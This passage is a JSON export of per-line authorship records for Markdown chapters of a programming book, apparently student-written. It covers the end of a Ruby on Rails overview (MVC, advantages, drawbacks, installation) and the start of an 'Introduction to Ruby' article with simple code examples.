        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "#### Model"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "The Model is very similar to a Class (à la Object-Oriented Programming), and is a useful abstraction for representing and encapsulating objects in your application. This is also known as the Active Record pattern in Rails. In this pattern, the Models are mapped to tables in the database, and you can query a model\u0027s fields directly in Ruby, instead of writing your own SQL queries. Models also have generic methods such as `find`, `all`, `create`, `save`, `update`, `delete` included in them by default, so you don\u0027t need to implement them yourself."
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "In our diagram, the Controller calls the `all` method in the `User` model, which is, by convention in a file called `User.rb`, which is stored along with all other models at `app/models/`. The model then acts as an intermediary between the application and the database, and returns the results of the corresponding query. "
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "#### View"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "After the Controller has fetched all the data necessary and applied whatever transformations are needed, it passes in the requisite fields to its view. The View is what the client sees, and is a collection of `.erb` (**E**mbedded **R**u**B**y) files, which are basically just HTML files with lines of Ruby code embedded in it to modify its appearance and behavior. When the controller is generated, a corresponding folder of views is made inside `app/views/`. All the `.erb` files are named after the controller action and stored in folders named after the controller. Following the same example above, Rails will serve up the `app/views/users/index.html.erb` view to the client when executing the `users#index` controller action, thus concluding the request-response cycle. "
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "## Why Rails"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "Many popular and very technically mature websites started off using, and continue to use Rails. These include: GitHub, Airbnb, Twitter, Hulu, Shopify, and Twitch, among others. Some of the key features that makes Rails the framework of choice for these users are:"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Fast Iteration Speed for Product Developement "
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "As an opinionated framework, Rails helps to automate trivial tasks by following certain conventions, which can make the development process faster. For example, in a Rails project that is connected to a database, each class is mapped to a table, as described in the Active Record Pattern, and the table name is just a pluralized version of the class\u0027s name - the `User` class becomes the `Users` table, the `Person` class becomes the `People` table, etc. This means that you don\u0027t need to spend any time deliberating on the name of the tables, nor do you have to juggle multiple concepts while mapping out the database and application, as Rails will automatically connect the two and spare you from deliberating about the exact name of the table. A similar approach is used to handle resources, which also automates much of the process."
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "The automation of these mundane tasks could make development a more enjoyable (more on that in a bit) and faster process. All of these optimizations can make developing an application between 30-40% faster on Rails [[source](https://www.forbes.com/sites/quora/2018/04/03/is-ruby-a-dying-language/#10eb4d0b6a3d)]. It also makes Rails relatively easy to learn, as you do not need to understand HTTP verbs to make a basic Rails application (while mastery of the topic will certainly help). Furthermore, programmers experienced in Rails usually find it easier to start on existing Rails projects, since the conventions followed are usually the same, giving you the same directory structure and route naming conventions everywhere. "
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "### Optimized for Programmer Happiness"
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "One of the primary tenets of Ruby was to make it the \"Least Surprising Language\", where the language was designed to feel intuitive and perform exactly as a developer would expect. In Rails, even more syntactic sugar is added on top of its Ruby foundations, in an effort to optimize for programmer happiness. As a result, Rails code tends to look very \"neat\" and feels inherently \"nice\" to write (as subjective as that sounds)."
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "For example, in order to fetch yesterday\u0027s date in Python, one may have to write"
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": "```python"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "import datetime"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": "datetime.datetime.now() - datetime.timedelta(days \u003d 1)"
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "The same action in Rails is done using"
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": "```ruby"
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": "1.day.ago"
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": "Similarly, Rails also added a new method to access an array element. Instead of following the C convention of using square-brackets to access the second element in the array \"elements\" like"
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": "```c"
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": "elements[1]"
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": "Rails developers can use ordinal representation to access the same element with the command"
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": "```ruby"
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": "elements.second"
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": "And while this may not reduce the amount one has to type, most Rails enthusiasts agree that it makes the code much more readable, easy to work with, and therefore happiness-inducing."
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": "### Large and Active Community of Developers"
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": "The Ruby language has a very passionate and extensive community of developers, and there is a vast array of libraries (called \"Gems\"), that can be used with your Rails projects. These libraries provide a lot of functionalities, and can be used to add flexibility to Rails projects when required. "
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": "Furthermore, as a result of its popularity, it is very likely that any problems you encounter with Rails will have a solution that you can find on Google or StackOverflow. For any new problems, you are also likely to receive a response very quickly, because the Ruby community prides itself for being welcoming and helpful. "
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": "## Drawbacks"
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": "Rails might not be best suited for all use cases, and there are a few areas that you should consider when deciding on your web framework of choice. "
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": "### Lack of Flexibility"
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": "Although Rails is highly optimized for most types of web applications, there are inevitably some cases where following an MVC architecture isn\u0027t suitable. In those cases, it might be better for developers to use frameworks that allow for more flexibility. You may also find Rails\u0027 defaults very stifling if you wish to have a different directory structure, or give your routes different names. While there are ways for you to configure Rails to your needs, it might be less painful to avoid those conventions from the beginning."
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": "### Performance"
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": "While newer releases have combated this problem to a large degree, many of the old releases of Rails have had a reputation for being very bloated and slow to respond. Applications in other frameworks, or purely client-side applications with a minimal backend, tend to have a much lower delay between an action and a response. While it should be noted that the vast majority of delays in applications occur due to poor optimization, and not the inherent speed of the framework, Rails still remains more bulky and slower than many of its competitors. "
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": "### Learning Curve"
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": "Rails\u0027 tendency to do things \"automagically\" can also be very confusing to new users, who might be more used to configuring routes and directory structures themselves. You may also find it challenging to switch to other frameworks, where you may be required to configure routes and write SQL queries yourself, instead of having the framework do it for you. You will also have to learn the Ruby language, and it might be harder considering that most front-end applications are in JavaScript and its variants, and you will have to juggle multiple languages while you develop your application. "
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "-"
        },
        "content": "## Getting Started"
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": "To install Rails on your computer, you will first need to install [Ruby](https://www.ruby-lang.org/en/). After this, you simply need to run:"
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": "```rb"
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": "gem install rails"
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "-"
        },
        "content": "`gem` is a package manager for Ruby that allows you to install Rails (as well as all the other Gems in Ruby). Once you\u0027re done with the setup, you can start developing applications right away. Here are some resources you might find helpful: "
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "-"
        },
        "content": "1. The [Ruby Guides](https://www.rubyguides.com/) are a must read, as you cannot use Rails without knowing the underlying language."
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "-"
        },
        "content": "2. The [Rails Guides](https://guides.rubyonrails.org/) are the definitive guide for Rails and you can be assured that it will always be up to date with the latest releases."
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "-"
        },
        "content": "3. [Go Rails](https://gorails.com/) also has great screencast tutorials that really hold your hand through the multitude of features Rails has, and can be used by more visual learners."
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "-"
        },
        "content": "4. [Rails Tutorial](https://www.railstutorial.org/book) is a book with a lot of advanced topics, so if you really want to study Rails in depth, consider this."
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": ""
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 2,
      "-": 167
    }
  },
  {
    "path": "contents/ruby/Ruby.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Introduction to Ruby"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Introduction to Ruby"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Authors: [Wilson Kurniawan](https://github.com/wkurniawan07)"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Ruby Overview‎](#ruby-overview)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Getting Started‎](#getting-started)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Everything is an object‎](#everything-is-an-object)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Readability is king‎](#readability-is-king)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Functional programming is encouraged‎](#functional-programming-is-encouraged)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Object-oriented programming is possible, too‎](#object-oriented-programming-is-possible-too)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Advanced Topics‎](#advanced-topics)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Ruby Frameworks and DevOps‎](#ruby-frameworks-and-devops)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": "## Ruby Overview"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": "**Ruby** is a **dynamic**, **reflective**, **object-oriented**, **general-purpose** programming-language, designed and developed by Yukihiro \"Matz\" Matsumoto in 1990s."
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": "It is widely used across many fields of computer science and software engineering, and its most prevalent use is in web development."
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": "Ruby boasts high programmer productivity with its concise, elegant, and human-readable syntax, which is widely agreed to outweigh the loss in execution speed (as compared to compiled languages such as C and Java) unless the latter is critical."
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e Often people, especially computer engineers, focus on the machines. They think, \"By doing this, the machine will run faster. By doing this, the machine will run more effectively. By doing this, the machine will something something something.\""
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e They are focusing on machines. But in fact, we need to focus on humans, on how humans care about doing programming or operating the application of the machines. We are the masters. They are the slaves."
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e "
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e *Yukihiro Matsumoto, creator of Ruby language* "
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "Popular websites running on Ruby: GitHub, Airbnb, Twitter, Shopify."
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "## Getting Started"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": "[The official website of Ruby](https://www.ruby-lang.org/en/) will have everything you need from release notes to downloads to documentations."
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "To install Ruby, go to the download page of the above website and follow the instructions."
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "If you\u0027re a Mac user, you don\u0027t need to do anything; Macs come with Ruby pre-installed!"
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "For beginners and intermediate users, [tutorialspoint](https://www.tutorialspoint.com/ruby/index.htm) has great introductory Ruby tutorials, and [rubylearning.com](http://rubylearning.com/satishtalim/tutorial.html) is another great place."
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "We will explore some of the more prominent language features of Ruby."
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Everything is an Object"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "Ruby has no concept of \"primitives\". Anything that can be assigned to a variable is an object. Even numbers and boolean values `true` and `false` are objects."
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "```rb"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "5.times do"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "  puts \"Hello world!\""
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "end"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "# Hello world!"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "# Hello world!"
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "# Hello world!"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": "# Hello world!"
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "# Hello world!"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "As such, it becomes very easy to introduce new functions to those \"primitives\":"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "```rb"
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "class Fixnum # integers in Ruby belong to this class"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "  def next()"
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "    return self + 1"
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "  end"
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "end"
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "7.next()"
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "#  \u003d\u003e 8"
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Readability is King"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e Ruby is simple in appearance, but is very complex inside, just like our human body."
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e "
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e *Yukihiro Matsumoto*"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "Some languages attempt to make their codes as close to pseudocode as possible, but Ruby takes it to another level: Ruby code flows almost as smoothly as an English literary text."
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "```rb"
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "for num in 0..5"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "  puts \"I am counting #{num}!\""
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "end"
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "unless number.even?"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "  puts \"Number is odd!\""
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "end"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "[\"chocolate\", \"strawberry\", \"vanilla\"].each { |flavour|"
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "  make_ice_cream(flavour)"
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "*No, you\u0027re not reading an English poem. You\u0027re reading Ruby!*"
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Functional Programming is Encouraged"
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "For those familiar with [higher-order functions](https://www.cse.unsw.edu.au/~en1000/haskell/hof.html), Ruby supports *map*, *fold-left*, and *filter*."
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": "```rb"
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "# Map"
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": "[1, 2, 3, 4, 5].map { |n| n * n }"
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "#  \u003d\u003e [1, 4, 9, 16, 25]"
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": "# Fold-left"
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "[1, 2, 3, 4, 5].inject(0) { |sum, n| sum + n }"
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": "#  \u003d\u003e 15"
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "# Filter"
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": "[1, 2, 3, 4, 5].select { |n| n.even? }"
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": "#  \u003d\u003e [2, 4]"
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "Joel McCracken makes an [excellent short presentation](https://joelmccracken.github.io/functional-programming-in-ruby/#/) on how functions are treated in Ruby."
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Object-Oriented Programming is Possible, Too"
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": "```rb"
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": "class Circle"
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": "  def initialize(r)"
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": "    @radius \u003d r"
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": "  end"
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": "  def get_radius"
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": "    return @radius"
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": "  end"
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": "  def get_area"
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": "    return Math::PI * @radius * @radius"
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": "  end"
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": "end"
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": "c \u003d Circle.new(5)"
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": "c.get_area"
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": "#  \u003d\u003e 78.53981633974483"
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 149,
        "author": {
